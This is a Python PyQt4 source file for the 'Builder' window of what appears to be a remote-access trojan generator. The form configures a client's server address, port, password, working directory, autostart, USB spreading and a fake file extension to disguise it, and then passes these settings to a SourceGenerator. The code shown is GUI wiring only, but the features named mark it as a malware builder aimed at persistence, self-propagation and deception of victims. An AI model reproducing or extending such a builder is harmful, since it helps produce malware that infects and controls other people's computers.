from ui.builder import Ui_Form as builderUi
from PyQt4.QtGui import *

import random
import string
import hashlib

from language import Translate
from client_code_generator import SourceGenerator

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class Builder(QWidget, builderUi):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        # START: triggers
        self.showPasswordButton.clicked.connect(self.set_password_echo_mode)
        self.generateRandomNameButton.clicked.connect(self.set_new_file_name)
        # END: triggers

        self.set_language()

    def set_language(self):

        # Window title
        self.setWindowTitle(_('BUILDER_TITLE'))

        # Client Configuration
        self.clientAddressLabel.setText(_('BUILDER_SERVER_ADDRESS_LABEL'))
        self.clientPortLabel.setText(_('BUILDER_SERVER_PORT_LABEL'))
        self.checkConnectionButton.setText(_('BUILDER_CHECK_CONNECTION_BUTTON'))
        self.serverPasswordLabel.setText(_('BUILDER_CLIENT_PASSWORD_LABEL'))
        self.connectionTimeoutLabel.setText(_('BUILDER_TIMEOUT_LABEL'))
        self.fileNameLabel.setText(_('BUILDER_FILE_NAME_LABEL'))
        self.workingDirLabel.setText(_('BUILDER_WORKING_DIR_LABEL'))
        self.currentUserLabel.setText(_('BUILDER_CURRENT_USER_LABEL'))
        self.autostartCheck.setText(_('BUILDER_AUTOSTART_CHECK'))
        self.usbSpredingCheck.setText(_('BUILDER_USB_SPREADING_CHECK'))
        self.FakeGroup.setTitle(_('BUILDER_FAKE_CHECK'))
        self.fakeFileExtensionLabel.setText(_('BUILDER_FAKE_FILE_EXTENSION_LABEL'))

    # generate random file name
    def set_new_file_name(self):
        self.clientFileNameLine.setText(self.randomword())

    # show/hide password
    def set_password_echo_mode(self):
        if self.showPasswordButton.isChecked():
            self.serverPasswordLine.setEchoMode(QLineEdit.Normal)
        else:
            self.serverPasswordLine.setEchoMode(QLineEdit.Password)

    def randomword(self, length=0):
        while len(str(length)) < 2:
            length = int(random.choice(string.digits)) + int(random.choice(string.digits))
        return ''.join(random.choice(string.lowercase + string.uppercase + '_') for i in range(length))

    def check_server_address(self):
        md5 = hashlib.md5()
        md5.update(str(self.clientAdressLine.text()))
        return md5.hexdigest()

    def check_port(self):
        return self.clientPortLine.text()

    def check_password(self):
        return str(self.serverPasswordLine.text())

    def check_timeout(self):
        return self.connectionTimeoutLine.text()

    def check_working_dir(self):
        return str(self.workingDirLine.text())

    def genereate_source(self):
        generator = SourceGenerator()
        generator.set_ip_address(self.check_server_address())
        generator.set_port(self.check_port())
        generator.set_passkey(self.check_password())
        #generator.set_timeout(self.check_timeout())
        generator.set_working_dir_name()


